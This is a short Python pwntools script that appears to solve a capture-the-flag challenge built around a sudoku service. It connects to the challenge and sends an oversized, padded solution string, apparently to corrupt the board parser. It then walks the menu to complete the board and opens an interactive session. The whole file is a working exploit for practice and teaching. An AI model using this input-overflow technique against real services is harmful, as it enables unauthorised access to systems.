import argparse

from pwn import remote

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))


# We leave the last element as 0 so we can send a valid solution
valid_board = [
    6, 2, 5, 8, 4, 3, 7, 9, 1,
    7, 9, 1, 2, 6, 5, 4, 8, 3,
    4, 8, 3, 9, 7, 1, 6, 2, 5,
    8, 1, 4, 5, 9, 7, 2, 3, 6,
    2, 3, 6, 1, 8, 4, 9, 5, 7,
    9, 5, 7, 3, 2, 6, 8, 1, 4,
    5, 6, 9, 4, 3, 2, 1, 7, 8,
    3, 4, 2, 7, 1, 8, 5, 6, 9,
    1, 7, 8, 6, 5, 9, 3, 4, 0,
]

board_str = ','.join(map(str, valid_board)).encode()

r.sendlineafter(b'>', b'2')
r.sendlineafter(b'solution:', b'1,'*128 + board_str + b','*102)

r.sendlineafter(b'>', b'3')

r.sendlineafter(b'>', b'2')
r.sendlineafter(b'solution:', b'2') # The last needed value

r.interactive()
